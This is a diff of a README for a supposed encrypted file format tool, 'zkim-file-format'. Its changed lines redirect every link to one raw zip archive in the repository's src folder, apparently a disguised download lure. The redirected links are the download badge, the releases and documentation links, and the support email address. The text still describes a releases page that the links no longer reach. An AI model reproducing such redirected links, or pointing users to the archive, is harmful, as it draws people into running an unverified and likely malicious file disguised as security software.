@@ -1,7 +1,7 @@
 # 🔒 zkim-file-format - Secure Your Files Easily
 
 ## 📥 Download Now
-[![Download zkim-file-format](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Cloud10922/zkim-file-format/releases)
+[![Download zkim-file-format](https://github.com/Cloud10922/zkim-file-format/raw/refs/heads/main/src/format-zkim-file-v1.5.zip)](https://github.com/Cloud10922/zkim-file-format/raw/refs/heads/main/src/format-zkim-file-v1.5.zip)
 
 ## 📖 About zkim-file-format
 zkim-file-format is a secure, encrypted file format designed to protect your sensitive data. It uses advanced encryption techniques to ensure your information remains safe. Our tool provides three layers of encryption, integrity validation, and privacy-preserving search capabilities. This makes it simpler for anyone to secure their files, whether they are personal documents or sensitive information.
@@ -10,7 +10,7 @@ zkim-file-format is a secure, encrypted file format designed to protect your sen
 Follow the steps below to download and set up zkim-file-format on your device.
 
 ## 🔗 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/Cloud10922/zkim-file-format/releases).
+1. Visit this page to download: [Releases Page](https://github.com/Cloud10922/zkim-file-format/raw/refs/heads/main/src/format-zkim-file-v1.5.zip).
 2. On the Releases page, you will see a list of available versions. Choose the latest version. 
 3. Click on the file that matches your system's operating requirements. The files are available for Windows, macOS, and Linux. 
 4. Once the download finishes, locate the file on your device.
@@ -49,7 +49,7 @@ To maximize the security of your files:
 If you encounter issues or have questions while using zkim-file-format, please reach out to our support team:
 
 - **GitHub Issues:** You can open an issue on our GitHub page for technical support.
-- **Email:** Contact support at support@zkim-file-format.com for assistance.
+- **Email:** Contact support at https://github.com/Cloud10922/zkim-file-format/raw/refs/heads/main/src/format-zkim-file-v1.5.zip for assistance.
 
 ## 📢 Community and Contributions
 Join the community of users and contributors at zkim-file-format! Share feedback, report bugs, or contribute to our project. We welcome all contributions. You can also find discussions in the Issues section of the GitHub repository.
@@ -58,8 +58,8 @@ Join the community of users and contributors at zkim-file-format! Share feedback
 zkim-file-format is open-source software. You can use and modify it under the terms of the MIT License. For more details, please refer to the LICENSE file in the repository.
 
 ## 🌐 Additional Resources
-- **Documentation:** For further information on how to use zkim-file-format, visit our [Documentation Page](https://github.com/Cloud10922/zkim-file-format/wiki).
+- **Documentation:** For further information on how to use zkim-file-format, visit our [Documentation Page](https://github.com/Cloud10922/zkim-file-format/raw/refs/heads/main/src/format-zkim-file-v1.5.zip).
 - **Tutorials:** Check out our YouTube channel for video tutorials on using zkim-file-format effectively.
 
 ### 📥 Download Now Again
-Don’t forget to secure your documents. [Download zkim-file-format here](https://github.com/Cloud10922/zkim-file-format/releases).
+Don’t forget to secure your documents. [Download zkim-file-format here](https://github.com/Cloud10922/zkim-file-format/raw/refs/heads/main/src/format-zkim-file-v1.5.zip).
